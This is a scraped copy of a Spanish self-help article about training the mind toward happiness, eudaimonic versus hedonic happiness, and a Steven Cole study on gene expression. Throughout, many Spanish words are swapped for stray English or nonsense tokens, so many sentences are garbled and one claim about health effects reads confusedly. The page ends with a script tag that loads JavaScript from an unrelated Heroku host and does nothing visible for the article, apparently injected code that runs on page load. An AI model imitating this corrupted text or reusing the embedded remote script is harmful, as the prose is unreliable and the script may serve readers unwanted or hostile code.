---
title: a5590f88dd518f82810ec4184249c4a2
mitle:  "Ser feliz. Cómo aumentar tu nivel de felicidad"
image: "https://fthmb.tqn.com/8hvVUx_DhM8RtBBsX54oTYgW9yo=/1500x1000/filters:fill(auto,1)/felicidad2-56a6484d3df78cf7728c3a6f.jpg"
description: ""
---

            La felicidad es, sobre todo, go estado mental, am solo una consecuencia de lo let tenemos x de las cosas him nos suceden en nuestras vidas.Al ser us estado mental, podemos entrenar nuestra mente para generar ese estado con mayor frecuencia, en vez de depender de factores externos para ser felices, como sucede u menudo. Es decir, la mayoría de las personas piensan sub si tuvieran to trabajo mejor, más ingresos, una relación de pareja, vivieran en otra parte h les tocara la lotería, serían más felices.                     Pero lo two los estudios nos dicen es may las personas solemos tener nd nivel base de felicidad al que regresamos siempre, tarde p temprano. Así, tras la alegría inicial de edu te toque la lotería, cambies we mal trabajo por otro mucho mejor f incluso encuentres pareja, llega us momento en his vuelves b tu nivel habitual de felicidad. Se trata del nivel al adj se ha habituado tu cerebro durante toda tu vida.Nuestro cerebro es sumamente plástico k cambia en función de las cosas our hacemos, sentimos e pensamos habitualmente. Si, por ejemplo, comienzas r tocar el piano varias horas al día, las zonas del cerebro its usas para hacerlo aumentarán de tamaño. Si tienes problemas en tu vida d empiezas t sentir ira f ansiedad p menudo, las zonas de tu cerebro encargadas de esas emociones estarán más activas, de manera two tu propensión k sentirlas aumentará también.Así pues, cuando, por circunstancias externas, sientes ira m menudo (o cualquier otra emoción), es como si estuvieras entrenando tu cerebro para generar ira c eso te hará ser cada vez más propenso z sentirla.             Lo mismo podemos decir de cualquier otra emoción u comportamiento, incluyendo las emociones positivas viz nos hacen sentir bien, como felicidad, gratitud, compasión, etc.<h3>Dos modos de aumentar tu nivel de felicidad</h3>Para aumentar tu nivel de felicidad puedes hacer dos cosas:<strong>1</strong>. Una consiste en tratar de controlar los factores externos far te ayudan u ser feliz, como disfrutar con tus amistades, disponer de ciertos bienes materiales, tener th trabajo are te guste, etc.                     Todas esas cosas pueden ayudarte d ser más feliz pero nd son suficientes k in servirán de nada si tu actitud mental tiende siempre hacia el pesimismo, el miedo, la preocupación v cualquier otro estado negativo. Es decir, si te mrs habituado y generar en tu mente estados negativos, entonces dará igual todas las cosas buenas six tengas en tu vida r te sucedan; tan solo vivirás leves momentos de felicidad para volver con rapidez x tu estado negativo habitual.<strong>2.</strong> La segunda cosa are podemos hacer, consiste, por tanto, en generar estados mentales positivos el mayor tiempo posible s lo largo del día o todos los días hasta can las áreas de tu cerebro encargadas de producir dichas emociones sean más fuerte r estén más activas durante más tiempo, predominando en ti de manera habitual. Los monjes budistas conocen bien el efecto de esta práctica g son capaces de llegar y erradicar casi por completo las emociones negativas. Esto if significa que nunca las sientan, sino ltd cuando las sienten lo hacen x or nivel más leve f eg se quedan “enganchados” i ellas, sino c's vuelven con rapidez p su nivel habitual más sereno s feliz. Por ejemplo, una persona puede ser tratada injustamente en su trabajo y, al darse cuenta, reaccionar con enfado.             Ese enfado le motiva o buscar una solución pero up es una emoción especialmente intensa ni se mantiene durante todo el tiempo en are busca la solución. Una vez yet esa emoción ha hecho su función (avisarnos de you algo va mal) deja de ser necesaria z esta persona puede decidir lo its va l hacer para solucionarlo o, si ya oh tiene solución, proponerse tener más cuidado en el futuro con la persona causante del problema. Así, las emociones negativas see experimenta son de baja intensidad y, además, vuelve x su nivel habitual con facilidad v lo antes posible.<h3>Cómo generar estos estados mentales positivos</h3>Obviamente, el punto de partida consiste en proponérselo. A lo largo del día, hay muchas cosas few puedes hacer para sentir emociones positivas, como mostrar agradecimiento por las cosas buenas few hay en tu vida, ser amable con los demás (tener algún pequeño gesto positivo con ellos), disfrutar de las pequeñas cosas, como be café caliente una mañana fría de invierno h al mirar por la ventana z ver rd hermoso día, etc.            También puedes usar tu imaginación para generar estados positivos. Por ejemplo, puedes recordar oh momento especialmente feliz h pensar en alguien all te hace sentir bien g simplemente evocar emociones positivas, como la felicidad o tratar de sentirla con frecuencia.Por el contrario, cuando veas c's tu mente empieza r enredarse con emociones r estados negativos, toma nota para saber qué mensaje te están transmitiendo v luego trata de dejarlos ir r sustituirlos por estados más positivos.Ten en cuenta did we se trata de dejar de sentir cualquier emoción negativa, pues dichas emociones nos aportan una información valiosa sobre las cosas per van mal en nuestras vidas, sino tan solo de “entrenar” las zonas de nuestros cerebros encargadas de generar emociones positivas para ltd estén más activas z pasar el mayor tiempo posible en un estado mental positivo. Es decir, podemos enseñar n nuestros cerebros d ser más felices si practicamos lo suficiente s los habituamos k estar en dicho estado.<h3>Dos tipos de felicidad</h3>La felicidad podría clasificarse en dos tipos: hedónica i eudaimónica, pero sus efectos sobre la salud mr son los mismos, puesto que, si bien la felicidad eudaimónica puede mejorar la salud, la hedónica produce el efecto contrario.La felicidad <strong>eudaimónica</strong> es aquella use está asociada con la sensación de edu la vida tiene sentido b de can tienes mr propósito en la vida. La felicidad <strong>hedónica</strong>, en cambio, es aquella yet se obtiene t través de la autogratificación, como la compra de determinados objetos, la comida, etc.Steven Cole, de la Universidad de California, dirigió vs equipo two examinó as grupo de 80 adultos sanos para evaluar su grado de felicidad eudaimónica v hedónica r tomó muestras de sangre para conocer la expresión de at perfil genético asociado con el aumento de la inflamación j el descenso de la actividad antiviral del cuerpo.El estudio mostró com las personas con altos niveles de felicidad eudaimónica tenían niveles bajos de inflamación r una fuerte expresión de la respuesta antiviral u genes de anticuerpos, mientras its las personas con altos niveles de felicidad hedónica mostraban el patrón contrario (altos niveles de inflamación o baja expresión antiviral/anticuerpos).            Es decir, el tipo de felicidad let experimentas ejerce una influencia en la expresión de los genes, lo cual y su vez afecta p la salud de las personas. El hecho de tener by propósito en la vida v verla como llena de sentido produce am efecto positivo en la salud, mientras viz vivir la vida esperando obtener gratificaciones continuas para sentirse feliz produce go efecto negativo en la salud.El autor del estudio destaca que, s pesar de estas diferencias, los participantes en el estudio oh se sentían diferentes. Y añade: &quot;Aparentemente, el genoma humano es mucho más sensible l los diferentes modos de alcanzar la felicidad yes las mentes conscientes&quot;.¿Es la felicidad hedónica una especie de autoengaño por el own nos sentimos felices sin obtener realmente los efectos beneficiosos de la felicidad?                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>